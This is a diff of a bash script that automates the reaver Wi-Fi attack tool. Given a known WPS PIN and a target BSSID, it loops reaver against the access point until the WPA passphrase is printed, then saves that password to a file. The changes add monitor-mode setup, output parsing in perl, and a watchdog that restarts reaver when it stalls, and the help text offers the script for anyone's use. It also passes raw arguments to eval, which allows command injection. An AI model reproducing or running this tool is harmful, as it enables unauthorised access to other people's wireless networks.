@@ -3,6 +3,10 @@
 # so script searches WPA PSK until reaver spits it out, using while loop
 # perl checks wheter PSK is printed, if so, exit is called.
 if [ -z "$1" ] || [ -z "$2" ]; then
+   echo "There's common situation that reaver finds pin, but without passphrase";
+   echo "Following script has been written to find passphrase - in case you know the pin";
+   echo "So for this purpose I wrote following script - you can use it if you have the same problem";
+   
    echo "Usage ( [obligatory parameter], [[optional parameter]] ):";
    echo "$0 [PIN] [BSSID] [[CHANNEL]]";
    echo "Example usage:"
@@ -10,35 +14,58 @@ if [ -z "$1" ] || [ -z "$2" ]; then
    exit;
 fi
 
+clearBssid(){
+    echo $1 | sed s/://g;
+}
+
 TMP_FILE="/tmp/reCheckFoundPinTMP";
+TMP_ACTIVITY_FILE="/tmp/reCheckFoundPinACTIVITY";
+CUR_DIR=$(pwd);
+PIN=$1;
+BSSID=$2;
+BSSID_CLEAR=$(clearBssid $BSSID);
+CHANNEL_CMD="";
+WRITE_FOUND_PASS_TO=$CUR_DIR'/'$BSSID_CLEAR'_FOUND_PASSWORD.txt';
+
 
 if [[ -z "$(ifconfig | grep mon0)" ]]; then
     airmon-ng start wlan0;
 fi
 
-CHANNEL="";
 if [[ -n "$3" ]]; then
-   CHANNEL="--channel=$3 ";
+   CHANNEL_CMD="--channel=$3 ";
 fi
 
 if [[ -f $TMP_FILE ]]; then
    rm $TMP_FILE;
 fi
 
+
+touch $TMP_ACTIVITY_FILE;
+
 while true; do
   if [[ -f $TMP_FILE ]]; then
       rm $TMP_FILE;
       exit;
   fi
-  sleep 5;
-  echo "reaver -p $1 -i mon0 -b $2 -vv -t 20 -g 1 -S -N $CHANNEL";
-  reaver -p $1 -i mon0 -b $2 -vv -t 20 -g 1 -S -N | perl -lane '
-    if (/WPA PSK/){
+  sleep 2;
+  COMMAND="reaver -p $PIN -i mon0 -b $BSSID -vv -t 20 -g 1 -S -N $CHANNEL_CMD";
+  echo $COMMAND;
+  eval $COMMAND | perl -lane '
+    if (/Received M3/){
 	print $_;
+	system("touch '$TMP_ACTIVITY_FILE'");
+    }
+    elsif (/WPA PSK/){
+	print $_;
+	open (F, ">>'$WRITE_FOUND_PASS_TO'");
+	print F $_;
+	close (F);
 	system("touch '$TMP_FILE'");
     }
     else {
 	print $_;
+	system("if [[ \"$('$CUR_DIR'/checkFileTouchTimeout.sh '$TMP_ACTIVITY_FILE' 60)\" == \"1\" ]]; then killall reaver; fi;");
     } 
 ';
 done
